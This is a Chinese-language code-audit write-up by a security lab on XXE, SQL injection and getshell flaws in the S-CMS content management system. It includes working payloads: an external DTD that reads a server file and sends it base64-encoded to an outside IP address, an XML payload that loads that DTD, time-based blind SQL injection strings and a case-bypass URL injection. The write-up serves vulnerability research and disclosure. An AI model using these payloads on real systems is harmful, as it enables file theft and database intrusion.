##  声明！

 **本文仅供学习和研究，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，海青实验室及文章作者不承担任何责任。**

**安全狗海青实验室拥有此文章的修改和解释权，如欲转载或传播，必须保证此文的完整性，包括版权声明在内的全部内容，未经海青实验室同意，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

##  **一、前言**

近来，海青的某小哥对S-CMS这套较为小型的CMS进行了代码审计，接着从中发现了多个SQL注入、2个XXE以及1个Getshell，后来，小哥在一个月黑风高的夜晚将它们整理成这篇推文，希望和对代码审计感兴趣的童鞋一起交流学习~

##  **二、初见XXE**

这个漏洞是在团队内部分享会上了解到的，说是这个CMS存在XXE漏洞，于是本着求真务实的精神，笔者便去寻找该漏洞点并一探究竟。

打开源码，全局搜索关键字simplexml就可以发现该漏洞点了。

![](https://image.3001.net/images/20190923/1569222186_5d886e2a48940.png!small)

进入存在漏洞的文件之中（weixin/index.php），关键代码如下：

![](https://image.3001.net/images/20190923/1569222201_5d886e39de1f3.png!small)

从上图上看，首
先使用php://input这种伪协议的方式给变量$postArr赋值，也就说该参数可控。紧接着这个值就被带入到simplexml_load_string函数之中进行解析。由于未对变量$postArr进行过滤，因此此处是一次非常标准且基础的XXE漏洞点。继续往下阅读代码，并未发现任何可以输出XML解析结果的地方，于是使用构造OOB（out-of-band）的方式将窃取到的数据进行外带。

##  **三、漏洞利用**

首先，在自己的云服务器(也可以使用DNSlog的方式)上配置一个attack.dtd文件，内容如下:

    
    
    <?xml version="1.0" encoding="UTF-8"?><!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/windows/win.ini"><!ENTITY % all "<!ENTITY send SYSTEM '<http://115.159.35.88/?%file>;'>">%all;

**![](https://image.3001.net/images/20190923/1569222217_5d886e49c352d.png!small)**

**稍微解释一下这个文件大概的作用。**
这个文件里的代码被引入执行以后，会读取目标服务器本地的c:/windows/win.ini文件，当然也可以读取任意文件，例如Linux下的/etc/passwd。读取到的内容会使用base64的方式进行加密，然后拼接在一个url之后进行一次GET请求，这样在我们的云服务器的请求日志上，就可以看到这个外带出来的信息。

在构造好文件以后，就要向目标服务器发送payload了

    
    
    <?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "<http://115.159.35.88/attack.dtd>">%remote;]><comment>  <text>test&ampsend</text></comment>

访问目标文件-->抓取数据包-->填入payload-->go

可以看到回显虽然报了警告，但是数据已经被外带出来，查看Nginx的请求日志。可以看到多出了两条记录，一条是请求attack.dtd文件的记录，一条是携带了数据信息的请求信息。

![](https://image.3001.net/images/20190923/1569222246_5d886e6613e98.png!small)

将信息base64解码，即可还原出信息。

![](https://image.3001.net/images/20190923/1569222252_5d886e6c1e849.png!small)

需要说明的是，XXE漏洞的利用对Libxml的版本是有要求的，在小于等于2.8.0版本下是容易产生该漏洞。而使用类似phpstudy这种集成环境建站时，应该注意使用的PHP版本，上述漏洞在5.4版本利用成功，5.6版本的并未成功。

##  **四、夏季大回馈，挖XXE送SQL注入？**

在上面的漏洞点处，继续往下审计几行代码，会发现存在一处SQL注入。

**果然每一个开发者，都有可能是CVE的生产者。**

![](https://image.3001.net/images/20190923/1569222261_5d886e753ad2e.png!small)

如上代码，可以看到使用XML方式传递数据以后，将解析的值拼接进了SQL语句。值得一提的是，这款CMS本身对GET和POST方式传参进行了特殊字符的过滤；当输入单引号的时候，则会被拦截。那么为何此处又存在SQL注入呢？

![](https://image.3001.net/images/20190923/1569222332_5d886ebcf3e9e.png!small)

**问题在于传参方式** ，由于XML是用php://input方式传入，从而绕过了检测机制，于是就产生了SQL注入。

加入了一句输出语句方便观察语句拼接的结果。

![](https://image.3001.net/images/20190923/1569222341_5d886ec554076.png!small)

传入各个参数，将流程控制到该SQL语句执行之处，可以看出语句被拼接进SQL语句之中。

![](https://image.3001.net/images/20190923/1569222348_5d886ecc91a35.png!small)

简单构造一个语句验证一下，明显延时了七秒，是一秒的七倍。至于为什么是七秒，笔者这里没有深究，多换几个数字发现符合这个规律，因此此处可以判断存在一个时间型盲注。

据说漏洞修补了？但是修补并不完全。

话不多说看代码。

![](https://image.3001.net/images/20190923/1569222356_5d886ed47e3d9.png!small)

可以看到虽然解析后的对象会用函数t进行过滤，但是由于过滤不严，导致依然能进行sql注入，空格被置空了，依然能用tab键代替。

![](https://image.3001.net/images/20190923/1569222364_5d886edc03cec.png!small)

效果如下：

    
    
    event subscribe -1' or if(sleep(1),1,1)--
![](https://image.3001.net/images/20190923/1569222375_5d886ee74e2f7.png!small)![](https://image.3001.net/images/20190923/1569222375_5d886ee759c0f.png!small)

##  **五、依葫芦画瓢--JSON解析后的SQL注入**

上面的注入是由于XML解析以后，得到各个对象直接被拼接进SQL语句。同样的，JSON传输数据也会存在这样的问题。得到json字符串之后进行解析，得到各个参数。

![](https://image.3001.net/images/20190923/1569222429_5d886f1d8a833.png!small)

为了进入SQL语句，需要满足各个参数拼接之后的MD5值和我们传入的sign是一样的，这个问题很好解决，直接把这个值打印出来，然后再修改sign发送数据包即可（当然也可以通过脚本计算好MD5）。

![](https://image.3001.net/images/20190923/1569222437_5d886f250c84a.png!small)

效果如下

![](https://image.3001.net/images/20190923/1569222443_5d886f2ba2932.png!small)

旧版本是存在callback3.php这个文件的，而最新版本，这个文件内容被暂时删了（哭了）。不过如果能控制PID = $C_7PID;$PKEY =
$C_7PKEY;这两个的值不为空的，那么在callback1.php和callback2.php中可以利用的。没进行深究这两个值的来源~

##  **六、又见XXE**

上述的两个漏洞，在我发现的时候已经被一个大佬先发现了，不能去CNVD换个小证书了~不甘心的又在源码之中翻了翻，许久之后，找到了第二处XXE漏洞点，问了问大佬，他说这里他还没发现。

**嗯哼，捡到漏了。**

漏洞文件（api\notify.php）

![](https://image.3001.net/images/20190923/1569222453_5d886f3528708.png!small)

看源代码，又是熟悉的配方，又是漏洞的味道。但是一开始并没发现这个点，是因为换了传参方式。上面提到的XXE是使用伪协议php://input的方式传参，而

    
    
    $GLOBALS['HTTP_RAW_POST_DATA']

在一些情况下，是和php://input传参效果是一样的。

在代码之中，加一句输出语句，来看看效果。

![](https://image.3001.net/images/20190923/1569222501_5d886f6520f04.png!small)

老套路，抓取数据包-->填入payload-->go

![](https://image.3001.net/images/20190923/1569222508_5d886f6cb444e.png!small)

问题出现了，并没有将我们传入的值打印出来？为何？这个问题百度可以解决。

知识点！划重点！

> 先加上原文链接，以示尊敬<https://www.cnblogs.com/mracale/p/10556520.html>

![](https://image.3001.net/images/20190923/1569222515_5d886f73cd3eb.png!small)

好的，那么搞起，改一下Coentent-Type的值。

![](https://image.3001.net/images/20190923/1569222585_5d886fb98c57b.png!small)

成功传入了参数，虽然爆出了警告信息，这个问题不大，主要是提示说后面的版本将要废弃这个变量，让我们改用php://input。既然可以传入参数，那么就又是初见时候的套路，嘿嘿，初恋的感觉。

![](https://image.3001.net/images/20190923/1569222595_5d886fc305178.png!small)

##  **七、SQL注入的四连超凡**

分标题有点标题党哈。京哥发现的前台有一处SQL注入，一共有四个文件都存在，看来实际开发的过程，写代码的是同一班人。取两个文件说明一下问题。

![](https://image.3001.net/images/20190923/1569222628_5d886fe44cb79.png!small)

首先将$SERVER["PHPSELF"]的值使用index.php进行分割，然后取第一个元素。加一句输出看看是什么效果。

echo splitx( $_SERVER["PHP_SELF"],"index.php",0);

![](https://image.3001.net/images/20190923/1569222634_5d886feac67d0.png!small)

取到的是/gov/，聪明的小伙伴应该想到，如果index.php是大写的呢？

![](https://image.3001.net/images/20190923/1569222640_5d886ff005ba6.png!small)

也就是，由于没找到index.php所以返回的第一个元素就是整个值。于是乎，构造payload

<http://127.0.0.1/gov/index.PHP/a>'%20where%20if(1,sleep(5),1)%23?action=update_dir

![](https://image.3001.net/images/20190923/1569222647_5d886ff75ef50.png!small)

此处由于是使用window的环境搭建的，也就是文件名对大小写不敏感。因此可以采用大小写的方式绕过。而在Linux下如果输入的是index.PHP，由于对文件名大小写敏感是找不到这个文件的，会报404错误，所以无法利用(只是我觉得无法利用)。

##  **八、第二个文件的相同问题**

amp.php文件有一段和上面相同的代码~
而这一处是在Linux和Windows下都可以利用的。由于字符串是以index.php作为分隔，所以访问amp.php是不可能会出现index.php，于是乎，分隔是没效果的。

![](https://image.3001.net/images/20190923/1569222657_5d88700196afd.png!small)

##  **九、一枚非常简单的SQL注入**

没啥好说的，上图。

![](https://image.3001.net/images/20190923/1569222795_5d88708b31638.png!small)

注册一个普通用户登陆之后

> 访问<http://127.0.0.1/gov/member/member_pay.php>

![](https://image.3001.net/images/20190923/1569222874_5d8870da731aa.png!small)

这个漏洞点需要登录，虽然是普通用户登录。但需要后台管理员开放了注册功能才可以注册。而后发现，注册功能存在逻辑问题，可以直接注册用户。

直接传入需要的参数，然后去获取验证码再填入即可。

![](https://image.3001.net/images/20190923/1569223025_5d88717116073.png!small)

从此处获取验证码

![](https://image.3001.net/images/20190923/1569222911_5d8870ff25dad.png!small)

##  **十、没有getshell的代码审计是没有灵魂的**

这个点getshell比较鸡肋。。因为是要获取后台权限，并且利用重装漏洞，这样对网站的破坏性太大，而且如果把安装文件给删了，就没法重装了也就没法getshell。

如下代码，用来判断是程序是否安装了。看上去虽然粗糙了点。。但是似乎没有毛病，如果能找到修改first.txt代码的地方，就可以触发重装漏洞了。

![](https://image.3001.net/images/20190923/1569222985_5d887149528f6.png!small)

在后台处管理文件处，可以对除了PHP文件之外的任意文件进行修改，包括first.txt。

![](https://image.3001.net/images/20190923/1569222955_5d88712bd588c.png!small)

随便修改一个值，然后保存，紧接着访问首页，即可重装系统了

![](https://image.3001.net/images/20190923/1569222952_5d887128e811d.png!small)

如下代码，显然，我们不可能在用户名和密码处进行代码的注入，因为如果密码错误，程序就不会往下进行了，但是可以数据库名处插入payload。在程序执行的末尾，会将配置信息写入配置文件，由于安装文件并没有引入核心的过滤文件，因此不会过滤单引号等特殊字符。

效果如下图

![](https://image.3001.net/images/20190923/1569223081_5d8871a9e4b77.png!small)

![](https://image.3001.net/images/20190923/1569223127_5d8871d7aa746.png!small)

***本文作者： 安全狗海青实验室，转载请注明来自FreeBuf.COM**  

